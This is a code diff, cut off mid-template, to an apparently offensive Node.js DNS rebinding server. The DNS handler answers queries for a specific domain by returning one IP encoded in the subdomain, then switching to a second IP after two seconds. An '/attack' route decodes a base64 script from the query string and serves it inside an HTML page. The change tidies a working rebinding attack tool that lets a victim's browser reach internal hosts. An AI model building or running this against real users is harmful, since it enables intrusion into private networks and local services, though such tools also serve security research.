@@ -22,8 +22,17 @@ dnsServer.on('query', query => {
 
   const splits = domain.split('.')
 
+  if(domain.indexOf('43z.one') < 0)
+    return
+
   if(splits.length != 6)
     return
+
+  if(type != 'A')
+    return
+
+  const ip1 = splits[1].replace(/-/g, '.')
+  const ip2 = splits[2].replace(/-/g, '.')
 
   if(!cache[domain]){
     cache[domain] = {
@@ -31,28 +40,25 @@ dnsServer.on('query', query => {
     }
   }
 
-  switch(type){
-    case 'A':
-      if(cache[domain].timeStamp > Date.now() - 2000){
-        let record = new dns.ARecord(splits[1].replace(/-/g, '.'))
-        query.addAnswer(domain, record, 0)
-      }else{
-        let record = new dns.ARecord(splits[2].replace(/-/g, '.'))
-        query.addAnswer(domain, record, 0)
-      }
-      break;
-      default:
-        return
-      break;
+  let record
+
+  if(cache[domain].timeStamp > Date.now() - 2000){
+    record = new dns.ARecord(ip1)
+  }else{
+    record = new dns.ARecord(ip2)
   }
 
-  console.log('DNS Query: (%s) %s', type, domain)
+  query.addAnswer(domain, record, 0)
   dnsServer.send(query)
+  console.log(`DNS A Query for ${domain} replied with ${record.target}`)
 })
 
 app.get('/attack', (req, res) => {
+  if(!req.query.script)
+    res.end()
+
   const script = new Buffer(req.query.script, 'base64').toString('ascii')
-  res.header("Access-Control-Allow-Origin", "*")
+
   res.end(`
     <html>
       <script>
